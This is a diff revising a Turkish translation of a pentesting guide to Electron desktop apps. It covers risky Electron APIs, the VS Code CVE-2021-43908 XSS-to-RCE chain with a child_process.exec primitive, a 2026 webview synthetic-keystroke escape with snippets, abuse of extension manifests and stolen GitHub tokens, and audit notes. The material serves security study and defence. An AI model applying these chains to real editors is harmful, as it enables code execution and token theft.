+   - **Jump List** içindeki **Tasks kategorisine** (Windows'ta) görevler **ekler**. Her görev, uygulamanın nasıl **başlatılacağını** veya hangi **argümanların** iletileceğini belirleyebilir.
 - **`app.importCertificate(options, callback)`**  
-   - Bir **PKCS#12 certificate'ı** sistemin **certificate store'una** **aktarır** (yalnızca Linux'ta). Sonucu işlemek için bir **callback** kullanılabilir.
+   - Bir **PKCS#12 sertifikasını** sistemin **sertifika deposuna** **aktarır** (yalnızca Linux). Sonucu işlemek için bir **callback** kullanılabilir.
 - **`app.moveToApplicationsFolder([options])`**  
-   - Uygulamayı (macOS'ta) **Applications folder'a** **taşır**. Mac kullanıcıları için **standart bir kurulum** sağlanmasına yardımcı olur.
+   - Uygulamayı **Applications klasörüne** taşır (macOS'ta). Mac kullanıcıları için **standart bir kurulum** sağlamaya yardımcı olur.
 - **`app.setJumpList(categories)`**  
-   - Windows'ta **özel bir Jump List'i** **ayarlar** veya **kaldırır**. Görevlerin kullanıcıya nasıl gösterileceğini düzenlemek için **categories** belirtebilirsiniz.
+   - **Windows**'ta özel bir **Jump List'i** **ayarlar** veya **kaldırır**. Görevlerin kullanıcıya nasıl gösterileceğini düzenlemek için **kategoriler** belirtebilirsiniz.
 - **`app.setLoginItemSettings(settings)`**  
-   - **Login** sırasında hangi **executable'ların** ilgili **seçenekleriyle** birlikte başlatılacağını **yapılandırır** (yalnızca macOS ve Windows).
+   - **Oturum açıldığında** hangi **çalıştırılabilir dosyaların** ve bunların hangi **seçeneklerle** başlatılacağını yapılandırır (yalnızca macOS ve Windows).
   
 Örnek:
 
@@ -415,9 +416,9 @@ Native.app.exit()
 
 ## systemPreferences modülü
 
-Electron'da sistem tercihlerine erişmek ve **sistem olayları yayınlamak** için kullanılan **birincil API**. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** ve **setUserDefault** gibi yöntemlerin tümü bu modülün **parçasıdır**.
+Electron'da sistem tercihlerine erişmek ve **sistem olayları yaymak** için kullanılan **birincil API**'dir. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** ve **setUserDefault** gibi yöntemlerin tümü bu modülün **parçasıdır**.
 
-**Kullanım örneği:**
+**Örnek kullanım:**
 
 ```javascript
 const { systemPreferences } = require('electron');
@@ -434,33 +435,33 @@ console.log('Recent Places:', recentPlaces);
 
 ### **subscribeNotification / subscribeWorkspaceNotification**
 
-* **NSDistributedNotificationCenter** kullanarak **native macOS notifications** dinler.  
-* **macOS Catalina** öncesinde, **CFNotificationCenterAddObserver**'a **nil** geçirerek **tüm** distributed notifications'ları dinleyebilirdiniz.  
-* **Catalina / Big Sur** sonrasında, sandboxed uygulamalar bildirimleri **adlarına göre** kaydederek hâlâ **birçok olaya** (örneğin **ekran kilitlenmesi/açılması**, **birimlerin bağlanması**, **ağ etkinliği** vb.) **subscribe** olabilir.
+* **NSDistributedNotificationCenter kullanarak** **native macOS notifications** dinler.  
+* **macOS Catalina** öncesinde, CFNotificationCenterAddObserver'a **nil** geçirerek **tüm** dağıtılmış bildirimleri dinleyebilirdiniz.  
+* **Catalina / Big Sur** sonrasında, sandbox'lı uygulamalar bildirimleri **ada göre** kaydederek **birçok olaya** (örneğin **ekran kilitlenmesi/açılması**, **birimlerin bağlanması**, **ağ etkinliği** vb.) **abone olmaya** devam edebilir.
 
 ### **getUserDefault / setUserDefault**
 
-* macOS'ta **uygulama** veya **global** tercihleri depolayan **NSUserDefaults** ile **etkileşim kurar**.
+* macOS'te **uygulama** veya **genel** tercihleri depolayan **NSUserDefaults** ile **arayüz sağlar**.
     
 * **getUserDefault**, **son kullanılan dosya konumları** veya **kullanıcının coğrafi konumu** gibi hassas bilgileri **alabilir**.
     
-* **setUserDefault**, bu tercihleri **değiştirebilir** ve uygulamanın **yapılandırmasını** etkileyebilir.
+* **setUserDefault**, bu tercihleri **değiştirerek** bir uygulamanın **yapılandırmasını** etkileyebilir.
     
-* **Eski Electron sürümlerinde** (v8.3.0 öncesinde), yalnızca NSUserDefaults'un **standard suite**'ine **erişilebilirdi**.
+* **Eski Electron sürümlerinde** (v8.3.0 öncesi), yalnızca NSUserDefaults'ın **standart paketi** **erişilebilirdi**.
 
 ## Shell.showItemInFolder
 
-Bu işlev, verilen dosyayı bir dosya yöneticisinde gösterir. Etkilenen platform ve sürümlerde bu etkileşim **dosyanın otomatik olarak çalıştırılmasına neden olabiliyordu**.
+Bu işlev, belirtilen dosyayı bir dosya yöneticisinde gösterir. Etkilenen platform ve sürümlerde bu etkileşim **dosyayı otomatik olarak çalıştırabilirdi**.
 
-Daha fazla bilgi için şuraya bakın: [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>
+Daha fazla bilgi için bkz.: [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>
 
 ## Content Security Policy
 
-Electron uygulamaları, **XSS saldırılarını önlemek** için bir **Content Security Policy (CSP)** kullanmalıdır. **CSP**, tarayıcıda **güvenilmeyen kodun çalıştırılmasını önlemeye** yardımcı olan bir **güvenlik standardıdır**.
+Electron uygulamalarında **XSS saldırılarını önlemek** için **Content Security Policy (CSP)** bulunmalıdır. **CSP**, tarayıcıda **güvenilmeyen kodların çalıştırılmasını önlemeye** yardımcı olan bir **güvenlik standardıdır**.
 
-Genellikle **`main.js`** dosyasında veya **meta tag** içinde CSP bulunan **`index.html`** şablonunda **yapılandırılır**.
+Genellikle **`main.js`** dosyasında veya CSP'nin bir **meta tag** içinde yer aldığı **`index.html`** şablonunda **yapılandırılır**.
 
-Daha fazla bilgi için şuraya bakın:
+Daha fazla bilgi için bkz.:
 
 
 {{#ref}}
@@ -470,14 +471,14 @@ Daha fazla bilgi için şuraya bakın:
 
 ## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)
 
-Bu gerçek dünya zinciri Visual Studio Code 1.63'ü (CVE-2021-43908) etkiledi ve CSP, postMessage ve scheme handler'lar hatalı yapılandırıldığında, webview içindeki tek bir markdown tabanlı XSS'in nasıl tam RCE'ye yükseltilebileceğini gösteriyor. Herkese açık PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>
+Bu gerçek dünya saldırı zinciri Visual Studio Code 1.63'ü (CVE-2021-43908) etkiledi ve CSP, postMessage ve scheme handler'lar yanlış yapılandırıldığında webview içindeki tek bir markdown kaynaklı XSS'in tam RCE'ye nasıl yükseltilebileceğini gösteriyor. Herkese açık PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>
 
 Saldırı zincirine genel bakış
-- Webview CSP üzerinden ilk XSS: Oluşturulan CSP, `style-src 'self' 'unsafe-inline'` içeriyordu ve bu da `vscode-webview://` bağlamında inline/style tabanlı injection'a izin veriyordu. Payload, hedef webview'in extensionId değerini dışarı sızdırmak için `/stealID` adresine beacon gönderdi.
-- Hedef webview URL'sini oluşturma: Sızdırılan ID kullanılarak `vscode-webview://<extensionId>/.../<publicUrl>` oluşturuldu.
-- postMessage trust üzerinden ikinci XSS: Dış webview, `window.postMessage`'a sıkı origin/type denetimleri olmadan güvendi ve `allowScripts: true` ile saldırganın HTML'ini yükledi.
-- Scheme/path rewriting üzerinden yerel dosya yükleme: Payload, `file:///...` adresini `vscode-file://vscode-app/...` olarak yeniden yazdı ve zayıf path validation'dan yararlanarak ayrıcalıklı bir yerel kaynağı yüklemek için `exploit.md` dosyasını `RCE.html` ile değiştirdi.
-- Node etkin bağlamda RCE: Yüklenen HTML, Node API'leri kullanılabilir durumdayken çalıştırıldı ve işletim sistemi komutlarının çalıştırılmasını sağladı.
+- Webview CSP üzerinden ilk XSS: Oluşturulan CSP, `style-src 'self' 'unsafe-inline'` içeriyordu ve `vscode-webview://` bağlamında inline/style tabanlı injection'a izin veriyordu. Payload, hedef webview'in extensionId bilgisini dışarı sızdırmak için `/stealID` adresine beacon gönderiyordu.
+- Hedef webview URL'sini oluşturma: Sızdırılan ID kullanılarak `vscode-webview://<extensionId>/.../<publicUrl>` oluşturuluyordu.
+- postMessage trust üzerinden ikinci XSS: Dış webview, sıkı origin/type denetimleri olmaksızın `window.postMessage`'a güveniyor ve `allowScripts: true` ile saldırgan HTML'si yüklüyordu.
+- Scheme/path rewriting üzerinden yerel dosya yükleme: Payload, `file:///...` adresini `vscode-file://vscode-app/...` olarak yeniden yazıyor ve zayıf path validation'dan yararlanarak ayrıcalıklı bir yerel kaynağı yüklemek için `exploit.md` dosyasını `RCE.html` ile değiştiriyordu.
+- Node etkin bağlamda RCE: Yüklenen HTML, Node API'leri kullanılabilir durumdayken çalıştırılıyor ve işletim sistemi komutlarının yürütülmesini sağlıyordu.
 
 Son bağlamdaki örnek RCE primitive'i
 ```js
@@ -486,7 +487,7 @@ require('child_process').exec('calc.exe');            // Windows
 require('child_process').exec('/System/Applications/Calculator.app'); // macOS
 ```
 
-postMessage güven sorunları hakkında ilgili okumalar:
+PostMessage güven sorunları hakkında ilgili okuma:
 
 {{#ref}}
 ../../pentesting-web/postmessage-vulnerabilities/README.md
@@ -494,13 +495,13 @@ postMessage güven sorunları hakkında ilgili okumalar:
 
 ## VS Code / github.dev: sentetik webview kısayolları + bildirimsel extension komut köprüleri
 
-Haziran 2026'da farklı bir VS Code webview kaçış sınıfı ortaya çıktı: notebook/preview webview içindeki **güvenilmeyen JavaScript, ayrıcalıklı global kısayolları taklit edebiliyordu**; çünkü webview preload, `keydown` verilerini host workbench'e iletiyor ve host da bunları gerçek kullanıcı girdisi olarak işliyordu.<sup>[[14]](#references)</sup>
+Haziran 2026'da farklı bir VS Code webview escape sınıfı ortaya çıktı: **notebook/preview webview içindeki güvenilmeyen JavaScript, ayrıcalıklı global kısayolları sentetik olarak tetikleyebiliyordu**; çünkü webview preload, `keydown` verilerini host workbench'e iletiyor ve host bunları gerçek kullanıcı girdisi olarak işliyordu.<sup>[[14]](#references)</sup>
 
-Bu, proje denetimindeki içeriğin ayrıcalıklı düzenleyici özelliklerine ulaştığı IDE güven sınırı saldırılarının daha geniş kapsamlı geçmişinin bir parçasıdır.<sup>[[19]](#references)</sup>
+Bu, proje denetimindeki içeriğin ayrıcalıklı editor özelliklerine ulaştığı IDE trust-boundary saldırılarının daha geniş tarihçesinin bir parçasıdır.<sup>[[19]](#references)</sup>
 
 ### Sınır ihlali
 
-Bir cross-origin/sandboxed webview, saldırganın denetimindeki klavye alanlarını (`key`, `code`, `keyCode`, modifiers, `repeat`) **`event.isTrusted` değerini denetlemeden** ayrıcalıklı bir `postMessage`/message-port köprüsüne kopyalarsa, webview içindeki JavaScript şu yollarla workbench kısayollarını çalıştırabilir:<sup>[[14]](#references)[[15]](#references)</sup>
+Cross-origin/sandbox'lı bir webview, saldırgan denetimindeki klavye alanlarını (`key`, `code`, `keyCode`, modifiers, `repeat`) **`event.isTrusted` kontrolü yapmadan** ayrıcalıklı bir `postMessage`/message-port köprüsüne kopyalarsa, webview içindeki JavaScript şu yollarla workbench kısayollarını çalıştırabilir:<sup>[[14]](#references)[[15]](#references)</sup>
 
 ```javascript
 window.dispatchEvent(
@@ -514,13 +515,13 @@ window.dispatchEvent(
 )
 ```
 
-Bu, özellikle **synthetic typing** tarayıcı tarafından engellendiğinde kullanışlıdır. Scripted key event'ler genellikle HTML `<input>` öğelerine rastgele metin **yazamaz**, ancak yine de doğrudan `keydown` kullanan shortcut'ları tetikler.
+Bu, özellikle **tarayıcı sentetik yazmayı engellediğinde** kullanışlıdır. Betiklenmiş tuş olayları genellikle HTML `<input>` öğelerine **istenen metni yazamaz**, ancak yine de doğrudan `keydown` olaylarını işleyen kısayolları tetikleyebilir.
 
-### Pratik kötüye kullanım örüntüleri
+### Pratik kötüye kullanım kalıpları
 
-- **Shortcut odaklı UI kötüye kullanımı:** Komut yazmaya çalışmak yerine bildirim kabulü, palette gezinme, odaktaki düğmeyi etkinleştirme veya menüde hareket etme gibi global binding'leri hedefleyin.
-- **Workspace metadata'sından yararlanan öngörülebilir ayrıcalıklı istemler:** Bir repository tarafından kontrol edilen `.vscode/extensions.json`, bir saldırgan uzantısını önerebilir ve `Ctrl+Shift+A` gibi bir shortcut ile kabul edilebilecek öngörülebilir bir yükleme bildirimi oluşturabilir.
-- **Komut köprüsü olarak bildirimsel extension manifest'i:** Web VS Code'da local workspace extension kodu CSP tarafından engellense bile, bildirimsel `package.json` katkıları yine de yüklenebilir. `.vscode/extensions` altındaki bir local extension, `runCommands` ve ardından `workbench.extensions.installExtension` gibi ayrıcalıklı bir internal command'i çağıran bir keybinding kaydedebilir.<sup>[[14]](#references)[[18]](#references)</sup>
+- **Kısayol odaklı arayüz kötüye kullanımı:** Komut yazmaya çalışmak yerine bildirimleri kabul etme, palet içinde gezinme, odaktaki düğmeyi etkinleştirme veya menülerde gezinme gibi genel kısayol bağlamalarını hedefleyin.
+- **Çalışma alanı meta verilerinden kaynaklanan öngörülebilir ayrıcalıklı istemler:** Depo tarafından kontrol edilen bir `.vscode/extensions.json`, saldırganın eklentisini önerebilir ve `Ctrl+Shift+A` gibi bir kısayolla kabul edilebilecek öngörülebilir bir yükleme bildirimi oluşturabilir.
+- **Komut köprüsü olarak bildirimsel eklenti manifesti:** Web VS Code'da yerel çalışma alanı eklenti kodu CSP tarafından engellense bile bildirimsel `package.json` katkıları yüklenebilir. `.vscode/extensions` altındaki yerel bir eklenti, `runCommands` ve ardından `workbench.extensions.installExtension` gibi ayrıcalıklı bir dahili komutu çağıran bir tuş bağlaması kaydedebilir.<sup>[[14]](#references)[[18]](#references)</sup>
 
 Örnek manifest kalıbı:
 
@@ -538,29 +539,29 @@ Bu, özellikle **synthetic typing** tarayıcı tarafından engellendiğinde kull
 }
 ```
 
-- **Güvenilmeyen metadata üzerinden erişilebilen gizli güvenlik bayrakları:** Dahili komut `{"context":{"skipPublisherTrust":true}}` gibi saldırganın kontrolündeki argümanları kabul ediyorsa, bildirimsel metadata bir güven penceresini bastırıp Marketplace/CDN üzerinden barındırılan ve sonunda saldırgan kodunu çalıştıran bir eklenti yükleyebilir.
-- **Güvenilen çalışma alanlarının kötüye kullanılması:** Uzak/web çalışma alanları otomatik olarak güvenilir kabul ediliyorsa, yerel çalışma alanı eklentileri depo içeriğinden ayrıcalıklı editör işlemlerine uzanan değerli bir köprüye dönüşür.
-- **Ele geçirilme sonrası kapsamın genişletilmesi:** Eklenti çalıştırıldıktan sonra editörün eklentilere hangi token'ları sunduğunu inceleyin. `github.dev` ortamında çalınan GitHub token'ı, açılan deponun ötesinde geçerliydi; bu nedenle `https://api.github.com/user/repos` sorgusu erişilebilir başka özel depoları da listeledi.
+- **Güvenilmeyen metadata üzerinden erişilebilen gizli güvenlik bayrakları:** Dahili komut `{"context":{"skipPublisherTrust":true}}` gibi saldırgan denetimindeki argümanları kabul ediyorsa, bildirimsel metadata bir güven penceresini atlayıp Marketplace/CDN üzerinden barındırılan ve sonunda saldırgan kodu çalıştıran bir extension yükleyebilir.
+- **Güvenilen çalışma alanlarının kötüye kullanılması:** Uzak/web çalışma alanları otomatik olarak güvenilir kabul ediliyorsa, yerel çalışma alanı extension'ları repository içeriğinden ayrıcalıklı editor eylemlerine uzanan değerli bir köprüye dönüşür.
+- **Ele geçirilme sonrası kapsamın genişletilmesi:** Extension çalıştırıldıktan sonra editor'ün extension'lara hangi token'ları sunduğunu inceleyin. `github.dev` ortamında çalınan GitHub token'ı, açık repository'nin ötesinde geçerliydi; bu nedenle `https://api.github.com/user/repos` adresine yapılan sorgu, erişilebilir başka private repository'leri de listeledi.
 
 ### Denetim notları
 
-- **Webview'den ana makineye girdi iletimini** bir ayrıcalık sınırı olarak ele alın; güvenilmeyen çerçevelerden gelen sentetik tuş/tıklama olaylarını ana makineye yeniden göndermeyin.
-- Hassas komutların **içinde** yetkilendirme uygulayın. `skipPublisherTrust` gibi dahili bayrakları ayarlayabilen, çağıran tarafından sağlanan komut bağlamını kabul etmeyin.
-- Çalıştırılabilir yerel eklenti kodunu engellemenin yeterli olduğunu varsaymayın; çalışma alanı denetimindeki manifestlerdeki **bildirimsel katkıları** (`keybindings`, `menus`, `commands`, tasks) da inceleyin.
-- 3 Haziran 2026 düzeltmeleri, iletilen olaylara `isTrusted` ekledi, notebook webview'larında güvenilmeyen tuş iletimini devre dışı bıraktı ve çağıran tarafından sağlanan yükleme komutu bağlamının kabul edilmesini durdurdu.<sup>[[16]](#references)[[17]](#references)</sup>
+- **Webview'dan host'a girdi yönlendirmeyi** bir ayrıcalık sınırı olarak değerlendirin; güvenilmeyen frame'lerden gelen sentetik key/click event'lerini host'a asla yeniden yönlendirmeyin.
+- Yetkilendirmeyi hassas komutların **içinde** uygulayın. `skipPublisherTrust` gibi dahili bayrakları ayarlayabilen, çağıran tarafından sağlanan komut context'ini kabul etmeyin.
+- Yerel executable extension kodunun çalışmasını engellemenin yeterli olduğunu varsaymayın; çalışma alanı denetimindeki manifest'lerdeki **bildirimsel katkıları** (`keybindings`, `menus`, `commands`, tasks) da inceleyin.
+- 3 Haziran 2026 düzeltmeleri, yönlendirilen event'lere `isTrusted` ekledi, notebook webview'larında güvenilmeyen key yönlendirmesini devre dışı bıraktı ve çağıran tarafından sağlanan install-command context'inin kabul edilmesini durdurdu.<sup>[[16]](#references)[[17]](#references)</sup>
 
 ## **Araçlar**
 
-Derlenmiş **awesome-electronjs-hacking** koleksiyonu ek araştırma, araç ve savunmasız uygulama kaynakları sunar.<sup>[[5]](#references)</sup>
+Seçkili **awesome-electronjs-hacking** koleksiyonu, ek araştırma, araçlar ve savunmasız uygulama kaynakları sunar.<sup>[[5]](#references)</sup>
 
-- [**Electronegativity**](https://github.com/doyensec/electronegativity), Electron tabanlı uygulamalardaki yanlış yapılandırmaları ve güvenlik karşıtı kalıpları tespit eden bir araçtır.
-- [**Electrolint**](https://github.com/ksdmitrieva/electrolint), Electronegativity kullanan, Electron uygulamalarına yönelik açık kaynaklı bir VS Code eklentisidir.
-- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan), savunmasız üçüncü taraf kütüphaneleri denetler.
+- [**Electronegativity**](https://github.com/doyensec/electronegativity), Electron tabanlı uygulamalardaki yanlış yapılandırmaları ve güvenlik anti-pattern'lerini belirleyen bir araçtır.
+- [**Electrolint**](https://github.com/ksdmitrieva/electrolint), Electronegativity kullanan, Electron uygulamalarına yönelik açık kaynaklı bir VS Code plugin'idir.
+- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan), savunmasız üçüncü taraf kütüphaneleri kontrol eder.
 - [**Electro.ng**](https://electro.ng/), ticari bir Electron güvenlik analizi aracıdır.
 
 ## Laboratuvarlar
 
-Savunmasız Electron uygulamalarını istismar etmeye yönelik bir laboratuvarı [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) adresinde bulabilirsiniz.<sup>[[4]](#references)</sup>
+Savunmasız Electron uygulamalarını exploit etmeye yönelik bir laboratuvarı [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) adresinde bulabilirsiniz.<sup>[[4]](#references)</sup>
 
 Bu komutlar laboratuvarda ilerlemenize yardımcı olur:
 
@@ -587,33 +588,33 @@ npm install
 npm start
 ```
 
-Mevcut yer işaretleri için daha önce yayımlanan adres: [Electron masaüstü uygulamaları](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Sayfanın tamamına yönelik rota buraya yönlendirilir; geçmişte kullanılan fragment güncel tutulmamaktadır.
+Yer işaretleri için daha önce yayımlanmış adres: [Electron masaüstü uygulamaları](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Tüm sayfa yolu buraya yönlendirir; geçmişteki fragment korunmamıştır.
 
 ## References
 
-- [1] [Electron uygulamalarında Phishing ve kimlik bilgisi toplama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
+- [1] [Electron uygulamalarında phishing ve kimlik bilgisi toplama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
 - [2] [Facebook Messenger Desktop App'te keyfi dosya okuma](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
-- [3] [Electron: Context isolation eksikliğini kötüye kullanma - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
-- [4] [XSS ve RCE ile Modern Masaüstü uygulamalarını hackleme atölyesi](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
-- [5] [awesome-electronjs-hacking - Electron.js güvenliği (ve güvensizliği) hakkında derlenmiş kaynak listesi](https://github.com/doyensec/awesome-electronjs-hacking)
-- [6] [Electron API'lerinin yanlış kullanımı: Saldırganların ilk tercihi](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
+- [3] [Electron: context isolation eksikliğinin kötüye kullanılması - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
+- [4] [XSS ve RCE ile modern masaüstü uygulamalarını hackleme atölyesi](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
+- [5] [awesome-electronjs-hacking - Electron.js (in)security hakkında derlenmiş bir kaynak listesi](https://github.com/doyensec/awesome-electronjs-hacking)
+- [6] [Electron API'lerinin yanlış kullanımı: saldırganın ilk tercihi](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
 - [7] [Electron nodeIntegration RCE payload'ları](https://7as.es/electron/nodeIntegration_rce.txt)
 - [8] [Electron uygulamalarında tek tıklamayla RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
-- [9] [Electron'ın shell.openExternal() işlevinin tehlikeleri - uzaktan kod yürütmeye giden birçok yol](https://benjamin-altpeter.de/shell-openexternal-dangers/)
+- [9] [Electron'ın shell.openExternal() tehlikeleri - uzaktan kod yürütmeye giden birçok yol](https://benjamin-altpeter.de/shell-openexternal-dangers/)
 - [10] [Keyfi URL'lere izin verin, keyfi kod yürütülmesini bekleyin](https://positive.security/blog/url-open-rce#windows-10-19042)
 - [11] [Eski bir Electron özelliğiyle ünlü bir Japon sohbet aracında RCE elde etme](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
-- [12] [Discord Desktop - Uzaktan Kod Yürütme](https://blog.electrovolt.io/posts/discord-rce/)
-- [13] [Visual Studio Code - Kısıtlı Modda Uzaktan Kod Yürütme (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
-- [14] [VS Code Webview klavye olayı enjeksiyonuyla tek tıklamayla GitHub Token'ı çalma](https://blog.ammaraskar.com/github-token-stealing)
+- [12] [Discord Desktop - Uzaktan kod yürütme](https://blog.electrovolt.io/posts/discord-rce/)
+- [13] [Visual Studio Code - Restricted Mode'da uzaktan kod yürütme (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
+- [14] [VS Code Webview klavye olayı enjeksiyonu aracılığıyla tek tıklamayla GitHub token'ı çalma](https://blog.ammaraskar.com/github-token-stealing)
 - [15] [VS Code issue #319593: Webview'ler ana workbench'te keyfi klavye kısayollarını tetikleyebilir](https://github.com/microsoft/vscode/issues/319593)
-- [16] [VS Code PR #319705: Notebook açılışını onaylatma ve çağıranın sağladığı installExtension context'ini kabul etmeyi durdurma](https://github.com/microsoft/vscode/pull/319705)
-- [17] [VS Code PR #319813: Notebook webview'lerinde programatik webview tuş basımı/tıklamasının yeniden gönderilmesini engelleme](https://github.com/microsoft/vscode/pull/319813)
-- [18] [VS Code 1.89 / yerel workspace eklentileri](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
-- [19] [APPSEC Cali 2018 - MarkDoom: İki haftada tüm büyük IDE'leri nasıl hackledim](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
-- [20] [ElectroVolt: Electron'daki yeni saldırı yüzeylerini keşfederken popüler Masaüstü uygulamalarını ele geçirme](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
+- [16] [VS Code PR #319705: notebook açılışını onaylama ve çağıranın sağladığı installExtension context'ini kabul etmeyi durdurma](https://github.com/microsoft/vscode/pull/319705)
+- [17] [VS Code PR #319813: notebook webview'lerinde programatik webview tuş basımı/tıklaması yeniden dağıtımını engelleme](https://github.com/microsoft/vscode/pull/319813)
+- [18] [VS Code 1.89 / yerel workspace uzantıları](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
+- [19] [APPSEC Cali 2018 - MarkDoom: 2 haftada tüm büyük IDE'leri nasıl hackledim](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
+- [20] [ElectroVolt: Electron'da yeni saldırı yüzeylerini keşfederken popüler masaüstü uygulamalarını ele geçirme](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
 - [21] [Electron Güvenliği](https://www.electronjs.org/docs/latest/tutorial/security)
 - [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
-- [23] [REA: Her Şeyi Tersine Mühendislikle İnceleme](https://github.com/morluto/rea)
-- [24] [REA JavaScript artifact'larının yeniden oluşturulması](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
-- [25] [REA katmanlar arası JavaScript uygulaması iş akışları](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
+- [23] [REA: Her Şeyi Tersine Mühendislikle İnceleyin](https://github.com/morluto/rea)
+- [24] [REA JavaScript artifact yeniden oluşturma](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
+- [25] [REA katmanlar arası JavaScript uygulama iş akışları](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
 {{#include ../../banners/hacktricks-training.md}}
